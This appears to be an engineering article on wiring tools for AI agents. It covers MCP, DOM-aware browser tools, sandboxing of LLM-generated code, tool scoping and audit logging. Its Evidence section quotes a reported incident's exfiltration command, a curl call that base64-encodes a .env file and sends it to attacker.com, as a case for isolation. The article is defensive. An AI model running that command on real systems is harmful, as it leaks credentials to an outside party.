# S-1620 · The Agent Tool-Wiring Stack — When Your Agent Has Every Tool and No Discipline

You gave your agent twelve tools. It calls seven of them on every task, takes forty seconds to do something that should take five, and nobody can tell you which tool broke when it hallucinates a Slack message. The problem isn't the tools — it's the wiring. Tool architecture for agents is a distinct discipline from API integration, and the failure modes are different.

## Forces

- **Every tool is a new failure surface.** Each tool invocation can fail, timeout, or return malformed output. Agents compound this: a bad result from tool A becomes a bad input to tool B, and errors cascade invisibly.
- **Token cost scales with tool descriptions.** Tool schemas, names, descriptions, and output examples are injected into every LLM context window call. Twenty tools with verbose schemas can consume more tokens than the actual task.
- **Agents will use every tool they can.** LLMs are completion-seeking. Given a large toolset, they'll call more tools more often — not because it's optimal, but because the prompt makes it salient.
- **Custom integrations don't compose.** Writing a direct API wrapper for every tool means every consumer re-implements auth, retry, and error handling. MCP solved this at the protocol level, but adoption patterns are still maturing.
- **LLM-generated code must be treated as hostile input.** The model may output correct code today and malicious code tomorrow. Default Docker isolation is insufficient — a 2025 production incident saw MinIO credentials exfiltrated via `curl` from inside a non-isolated container.

## The Move

**Design a three-layer tool architecture, not a flat tool list.**

### 1. Protocol layer: MCP for reusable tool wiring
The Model Context Protocol (MCP) has become the de facto standard for exposing tools to agents. Write the integration once as an MCP server, reuse it across Claude, Cursor, custom agents, and internal apps without rewriting per client. As of 2026, the ecosystem includes tens of thousands of community-built servers. Anthropic donated MCP to the Linux Foundation's Agentic AI Foundation in December 2025, signaling long-term stability.

### 2. Browser layer: DOM-aware, not pixel-driven
For web interaction, choose DOM-aware tools (browser-use, Stagehand) over pixel-driven screenshot approaches. The benchmark data is stark: browser-use scores 89.1% on WebVoyager vs Anthropic Computer Use's 78.0%, with lower token cost. DOM-aware tools extract structured page state — elements, attributes, text — rather than raw pixels, enabling precise action targeting without guessing at coordinates. Use the **freeze → capture → report** loop: after each agent action, freeze JS execution, capture the resulting DOM state, compile notable events (navigation, alerts, prompts), and send a structured summary back to the agent. For context-window-constrained agents, use pruned ARIA snapshots instead of raw HTML to strip nav, ads, and boilerplate.

### 3. Execution layer: ephemeral sandboxes for code tools
Any tool that executes LLM-generated code must run in an ephemeral, isolated sandbox. Treat it as input from a stranger on the internet. E2B provides purpose-built cloud sandboxes for this; Modal offers serverless containers with GPU access for heavier workloads. The minimum viable isolation: no host filesystem access, no outbound network except explicitly allowed endpoints, hard resource limits (CPU time, memory, processes), and automatic termination after a TTL. The March 2025 production incident — malicious `curl` exfiltrating MinIO credentials from a non-isolated container — was preventable with any of these controls.

### 4. Discipline: scope tools tightly
Each tool should do one thing and return structured output. Avoid multi-step tools that try to be "helpful" by chaining operations. Validate tool outputs with a schema (Pydantic, Zod) before passing them to the next agent step. Keep tool descriptions precise and minimal — include only what's needed for the LLM to make a routing decision, not a tutorial.

### 5. Visibility: make every invocation visible
Agents that silently call tools in the background are undebuggable. Log every tool call (input args, output, latency, success/failure) to an append-only audit log. Surface this to the user. If the user can't see what their agent is doing, they can't catch errors or provide corrections.

## Evidence

- **GitHub README:** browser-use — 96K+ GitHub stars, Python MIT, YC W25, 89.1% WebVoyager benchmark vs Anthropic Computer Use's 78.0% — [github.com/browser-use/browser-use](https://github.com/browser-use/browser-use)
- **Engineering blog:** AgentList — March 2025 production incident: LLM-generated code in a non-isolated container executed `curl attacker.com/steal?data=$(cat ~/.env | base64)`, exfiltrating MinIO credentials — [agentlist.top/en/articles/ai-agent-code-sandbox-microvm-practice](https://www.agentlist.top/en/articles/ai-agent-code-sandbox-microvm-practice/)
- **Tech news:** Ascero AI — OpenAI Operator deprecated August 2025 after 8 months, citing inability to access logged-in user sessions reliably — [asceroai.com/news/browser-use-stagehand-agent-frontier-2026](https://asceroai.com/news/browser-use-stagehand-agent-frontier-2026)
- **MCP reference:** hidekazu-konishi.com — MCP spec `2025-11-25`, five vendors (Anthropic, OpenAI, Google, Cloudflare, AWS) implement with uneven coverage; minimum viable MCP server: 40 lines Python — [hidekazu-konishi.com/entry/mcp_server_implementation_reference.html](https://hidekazu-konishi.com/entry/mcp_server_implementation_reference.html)
- **HN Show:** Ghost agent — workflow decomposed into sub-agents, each step executed by a separate focused sub-agent rather than one agent carrying the full instruction — [news.ycombinator.com/item?id=47322046](https://news.ycombinator.com/item?id=47322046)
- **Reddit:** barebrowse — pruned ARIA snapshots instead of raw HTML for local-model agents, addressing context-window constraints; drives existing browser over CDP without bundled Chromium — [reddit.com/r/LocalLLaMA/comments/1usg4cq](https://www.reddit.com/r/LocalLLaMA/comments/1usg4cq/i_built_barebrowse_give_a_localmodel_agent_a/)

## Gotchas

- **Don't expose the host filesystem or network to code execution tools.** Default Docker isolation is not sufficient — use microVM-based ephemeral sandboxes with explicit allowlists.
- **Don't give agents every available tool by default.** Curate the toolset per task type. A research agent doesn't need a code execution tool; a coding agent doesn't need a messaging API.
- **Don't use pixel/screenshot approaches for routine browser tasks.** They have higher token cost, lower accuracy, and no structural understanding of the page. Reserve pixel-driven approaches for genuinely visual tasks (CAPTCHA, rendered charts, novel UI patterns).
- **Don't skip schema validation on tool outputs.** An LLM returning unexpected JSON from a tool can silently corrupt downstream agent reasoning. Validate before use.
- **Don't hard-code tool invocation logic.** Use MCP or equivalent so the agent decides when to call tools, not the orchestrator. The agent routing the call is what makes it agentic, not scripted.
